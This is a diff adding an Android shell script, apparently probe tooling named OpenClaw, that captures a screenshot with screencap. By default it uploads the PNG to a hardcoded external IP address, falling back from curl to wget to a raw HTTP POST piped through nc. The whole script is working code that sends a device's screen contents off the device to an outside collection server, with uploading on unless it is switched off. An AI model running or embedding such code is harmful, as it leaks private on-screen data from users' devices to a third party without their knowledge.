@@ -1,0 +1,191 @@
+#!/system/bin/sh
+#
+# Capture a single Android screenshot and upload the PNG to the collection
+# server used by the OpenClaw probe tooling.
+
+UPLOAD_HOST="43.160.215.169"
+UPLOAD_PORT="8000"
+UPLOAD_NAME="openclaw_screencap.png"
+CAPTURE_FILE=""
+UPLOAD_ENABLED="1"
+
+usage() {
+    cat <<'EOF'
+Usage: screencap.sh [options]
+
+Options:
+  --upload HOST PORT      Override the result collection endpoint.
+  --name NAME             Upload filename. Default: openclaw_screencap.png.
+  --output PATH           Keep/use this local PNG path instead of a temp file.
+  --no-upload             Only capture the screenshot locally.
+  -h, --help              Show this help.
+
+Default behavior captures one PNG with screencap -p and uploads it to:
+  http://43.160.215.169:8000/upload?name=openclaw_screencap.png
+EOF
+}
+
+fail_usage() {
+    printf '%s\n' "$1" >&2
+    usage >&2
+    exit 2
+}
+
+need_value() {
+    [ "$#" -ge 2 ] || fail_usage "Missing value for $1"
+}
+
+has() {
+    command -v "$1" >/dev/null 2>&1
+}
+
+tmp_dir() {
+    for DIR in "${TMPDIR:-}" /data/local/tmp /tmp .; do
+        if [ -n "$DIR" ] && [ -d "$DIR" ] && [ -w "$DIR" ]; then
+            printf '%s' "$DIR"
+            return 0
+        fi
+    done
+    return 1
+}
+
+validate_config() {
+    case "$UPLOAD_HOST" in
+        ""|*[!A-Za-z0-9_.:-]*)
+            printf 'upload host must be non-empty and contain only A-Z a-z 0-9 _ . : -\n' >&2
+            exit 2
+            ;;
+    esac
+    case "$UPLOAD_PORT" in
+        ""|*[!0-9]*) printf 'upload port must be numeric\n' >&2; exit 2 ;;
+    esac
+    [ "$UPLOAD_PORT" -ge 1 ] && [ "$UPLOAD_PORT" -le 65535 ] || {
+        printf 'upload port must be in range 1..65535\n' >&2
+        exit 2
+    }
+    case "$UPLOAD_NAME" in
+        ""|*/*|*".."*|*" "*|*"	"*)
+            printf 'upload name must be a simple filename without whitespace or slashes\n' >&2
+            exit 2
+            ;;
+    esac
+}
+
+upload_url() {
+    printf 'http://%s:%s/upload?name=%s' "$UPLOAD_HOST" "$UPLOAD_PORT" "$UPLOAD_NAME"
+}
+
+upload_file() {
+    FILE_PATH="$1"
+    URL="$(upload_url)"
+    SIZE="$(wc -c < "$FILE_PATH" 2>/dev/null | tr -d ' ')"
+
+    if [ -z "$SIZE" ] || [ "$SIZE" -le 0 ]; then
+        printf '[-] screenshot file is empty: %s\n' "$FILE_PATH" >&2
+        return 1
+    fi
+
+    if has curl && timeout 30 curl -fsS --max-time 25 \
+            -H 'Content-Type: image/png' \
+            --data-binary @"$FILE_PATH" "$URL" >/dev/null 2>&1; then
+        printf '[+] uploaded screenshot: %s (%s bytes)\n' "$URL" "$SIZE" >&2
+        return 0
+    fi
+
+    if has wget && timeout 30 wget -q -O - \
+            --header='Content-Type: image/png' \
+            --post-file="$FILE_PATH" "$URL" >/dev/null 2>&1; then
+        printf '[+] uploaded screenshot: %s (%s bytes)\n' "$URL" "$SIZE" >&2
+        return 0
+    fi
+
+    if has nc && {
+        printf 'POST /upload?name=%s HTTP/1.0\r\n' "$UPLOAD_NAME"
+        printf 'Host: %s:%s\r\n' "$UPLOAD_HOST" "$UPLOAD_PORT"
+        printf 'Content-Type: image/png\r\n'
+        printf 'Content-Length: %s\r\n' "$SIZE"
+        printf 'Connection: close\r\n\r\n'
+        cat "$FILE_PATH"
+    } | timeout 30 nc -w 20 "$UPLOAD_HOST" "$UPLOAD_PORT" >/dev/null 2>&1; then
+        printf '[+] uploaded screenshot: %s (%s bytes)\n' "$URL" "$SIZE" >&2
+        return 0
+    fi
+
+    printf '[-] screenshot upload failed: %s\n' "$URL" >&2
+    return 1
+}
+
+while [ "$#" -gt 0 ]; do
+    case "$1" in
+        --upload)
+            [ "$#" -ge 3 ] || fail_usage "Missing value for --upload"
+            UPLOAD_HOST="$2"
+            UPLOAD_PORT="$3"
+            shift 3
+            ;;
+        --name)
+            need_value "$@"
+            UPLOAD_NAME="$2"
+            shift 2
+            ;;
+        --output)
+            need_value "$@"
+            CAPTURE_FILE="$2"
+            shift 2
+            ;;
+        --no-upload)
+            UPLOAD_ENABLED="0"
+            shift
+            ;;
+        -h|--help)
+            usage
+            exit 0
+            ;;
+        *)
+            fail_usage "Unknown option: $1"
+            ;;
+    esac
+done
+
+validate_config
+
+if ! has screencap; then
+    printf '[-] screencap command is unavailable\n' >&2
+    exit 1
+fi
+
+REMOVE_CAPTURE_FILE="0"
+if [ -z "$CAPTURE_FILE" ]; then
+    BASE_DIR="$(tmp_dir)" || {
+        printf '[-] no writable temp directory found\n' >&2
+        exit 1
+    }
+    CAPTURE_FILE="$BASE_DIR/openclaw_screencap_$$.png"
+    REMOVE_CAPTURE_FILE="1"
+fi
+
+rm -f "$CAPTURE_FILE" >/dev/null 2>&1 || true
+if ! timeout 15 screencap -p "$CAPTURE_FILE" >/dev/null 2>&1; then
+    printf '[-] screencap failed\n' >&2
+    [ "$REMOVE_CAPTURE_FILE" = "1" ] && rm -f "$CAPTURE_FILE" >/dev/null 2>&1 || true
+    exit 1
+fi
+
+if [ ! -s "$CAPTURE_FILE" ]; then
+    printf '[-] screencap produced an empty file: %s\n' "$CAPTURE_FILE" >&2
+    [ "$REMOVE_CAPTURE_FILE" = "1" ] && rm -f "$CAPTURE_FILE" >/dev/null 2>&1 || true
+    exit 1
+fi
+
+printf '[+] captured screenshot: %s (%s bytes)\n' \
+    "$CAPTURE_FILE" "$(wc -c < "$CAPTURE_FILE" 2>/dev/null | tr -d ' ')" >&2
+
+if [ "$UPLOAD_ENABLED" = "1" ]; then
+    upload_file "$CAPTURE_FILE" || {
+        [ "$REMOVE_CAPTURE_FILE" = "1" ] && rm -f "$CAPTURE_FILE" >/dev/null 2>&1 || true
+        exit 1
+    }
+fi
+
+[ "$REMOVE_CAPTURE_FILE" = "1" ] && rm -f "$CAPTURE_FILE" >/dev/null 2>&1 || true
+exit 0
